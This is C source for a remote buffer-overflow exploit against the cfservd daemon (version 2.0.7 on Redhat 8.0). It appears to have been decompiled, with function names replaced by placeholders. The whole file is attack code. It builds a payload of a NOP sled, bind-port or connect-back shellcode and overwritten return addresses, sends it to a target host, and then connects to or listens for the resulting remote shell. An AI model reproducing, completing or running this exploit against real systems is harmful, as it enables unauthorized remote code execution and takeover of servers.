#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  sockadd ;

/* Variables and functions */
 void* AF_INET ; 
 int ALIGN ; 
 int BUFF_SIZE ; 
 char EOF ; 
 int /*<<< orphan*/  HDR ; 
 int HDR_SIZE ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  PORT_OFFSET_1 ; 
 int /*<<< orphan*/  PORT_OFFSET_2 ; 
 int RET_ADDR ; 
 int RET_OFFSET ; 
 int RET_SIZE ; 
 int SC_SIZE_1 ; 
 int SC_SIZE_2 ; 
 int /*<<< orphan*/  SIGALRM ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int S_PORT ; 
 int TIME_OUT ; 
 int T_PORT ; 
 int FUNC0 (int,struct sockaddr*,int*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (char*) ; 
 scalar_t__ FUNC3 (int,struct sockaddr*,int) ; 
 void** bindport ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (void**,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 void** connback ; 
 scalar_t__ FUNC7 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC11 () ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,char*,...) ; 
 char FUNC13 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ) ; 
 void* FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (char*) ; 
 char* FUNC17 (TYPE_1__) ; 
 scalar_t__ FUNC18 (int,int /*<<< orphan*/ ) ; 
 char* FUNC19 (int) ; 
 int /*<<< orphan*/  FUNC20 (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 scalar_t__ FUNC21 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC22 (int) ; 
 int /*<<< orphan*/  sigalrm ; 
 int /*<<< orphan*/  FUNC23 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC24 (int) ; 
 int FUNC25 (void*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC26 (char*,char*) ; 
 int /*<<< orphan*/  FUNC27 (char*) ; 
 int /*<<< orphan*/  FUNC28 () ; 

int FUNC29(int argc, char *argv[]) {

	char opt;
	char *buf, *ptr, *ip="";
	struct sockaddr_in sockadd;
	int i, s1, s2, i_len, ok=0, mode=0;
	int time_out=TIME_OUT, scsize=SC_SIZE_1;
	int s_port=S_PORT, t_port=T_PORT, offset=RET_OFFSET;
	int retsize=RET_SIZE, align=ALIGN, buffsize=BUFF_SIZE;
	long ret_addr;

	if (argc<2) { FUNC27(argv[0]); }

	while ((opt=FUNC13(argc,argv,"i:r:b:a:h:t:s:o:T:l"))!=EOF) {
		switch(opt) {
			case 'i':
			ip=optarg;
			FUNC4(ip);
			break;

			case 'l':
			mode=1;
			scsize=SC_SIZE_2;
			break;
			
			case 'T':
			time_out=FUNC2(optarg);
			break;

			case 'b':
			buffsize=FUNC2(optarg);
			break;

			case 'a':
			align=FUNC2(optarg);
			break;

			case 'h':
			ok=1;
			sockadd.sin_addr.s_addr = FUNC16(optarg);
			break;

			case 'r':
			retsize=FUNC2(optarg);
			break;

			case 't':
			t_port=FUNC2(optarg);
			break;

			case 's':
			s_port=FUNC2(optarg);
			break;

			case 'o':
			offset=FUNC2(optarg);
			break;

			default:
			FUNC27(argv[0]);
			break;
		}
	}

	if (!ok || (mode&&((FUNC26(ip,"")==0)) ) ) { FUNC27(argv[0]); }

	if (!(buf=FUNC19(buffsize+1))) {
		FUNC9("-> malloc() error");
	}

	ret_addr=RET_ADDR-offset;
	FUNC12(stdout,"\nCfservd Remote Exploit by snooq [ jinyean@hotmail.com ]\n");
	FUNC12(stdout,"Tested to work against cfservd 2.0.7 on Redhat 8.0\n\n");
	FUNC12(stdout,"-> Using return address of 0x%08lx\n", ret_addr);

	ptr=buf;
	for(i=0;i<HDR_SIZE+align;i++) { *ptr++=HDR; }
	for(i=0;i<(buffsize-HDR_SIZE-align-scsize-retsize);i++) { *ptr++=NOP; }
	if (mode) {
	    	FUNC5(connback, s_port, PORT_OFFSET_2);
	    	for(i=0;i<scsize;i++) { *ptr++=connback[i]; }
	}
	else {
		FUNC5(bindport, s_port, PORT_OFFSET_1);
		for(i=0;i<scsize;i++) { *ptr++=bindport[i]; }
	}
	for(i=0;i<retsize;i+=4) {
		*((long *)ptr)=ret_addr;
		ptr+=4;
	}
	*ptr++=0;

	sockadd.sin_family = AF_INET;
	sockadd.sin_port = FUNC15(t_port);

	if ((s1=FUNC25(AF_INET,SOCK_STREAM,0))<0) {
		FUNC9("-> socket error");
	}

	if(FUNC7(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
		FUNC9("-> connect() error");
	}

	if (mode) {

		FUNC12(stdout,"-> 'Listening' mode...( port: %d )\n",s_port);

		if (FUNC11()==0) {
			FUNC24(2);
			if (FUNC21(s1,buf,buffsize,0)<0) {
				FUNC9("-> send() error");
			}
			FUNC12(stdout,"-> Exploit string sent....\n");
			FUNC10(0);
		}

		else {

			FUNC23(SIGALRM,sigalrm);
			FUNC1(time_out);

			if ((s2=FUNC25(AF_INET,SOCK_STREAM,0))<0) {
        			FUNC9("-> socket error");
			}

			FUNC20(&sockadd,0,sizeof(sockadd));
			sockadd.sin_family = AF_INET;
			sockadd.sin_port = FUNC15(s_port);
			sockadd.sin_addr.s_addr = FUNC14(INADDR_ANY);
			i_len=sizeof(sockadd);

			if (FUNC3(s2,(struct sockaddr *)&sockadd,i_len)<0) {
				FUNC9("-> bind() error");
			}

			if (FUNC18(s2,0)<0) {
				FUNC9("-> listen() error");
			}

			FUNC28();
			FUNC6(s1);
			FUNC12(stdout,"-> Waiting for connection....\n");

			s1=FUNC0(s2,(struct sockaddr *)&sockadd,&i_len);

			if (s1<0) {
				FUNC9("-> accept() error");
			}

			FUNC1(0);

			FUNC12(stdout,"-> Connection from: %s\n",FUNC17(sockadd.sin_addr));

			FUNC22(s1);
			FUNC8(s1);

		}

	}

	else {

		if (FUNC21(s1,buf,buffsize,0)<0) {
			FUNC9("-> send() error");
		}

		FUNC6(s1);
		
		FUNC12(stdout,"-> 'Connecting' mode...\n");
		FUNC12(stdout,"-> Exploit string sent. Waiting for a shell...\n");
		FUNC24(2);

		sockadd.sin_family = AF_INET;
		sockadd.sin_port = FUNC15(s_port);

		if ((s1=FUNC25(AF_INET,SOCK_STREAM,0))<0) {
			FUNC9("-> socket() error");
		}

		if(FUNC7(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
        		FUNC12(stdout,"-> Exploit failed. Target probably segfaulted...\n\n");
			FUNC10(0);
		}
    
		FUNC12(stdout,"-> Connecting to shell at %s:%d\n",FUNC17(sockadd.sin_addr),s_port);

		FUNC22(s1);
		FUNC8(s1);

	}

	return(0);
	
}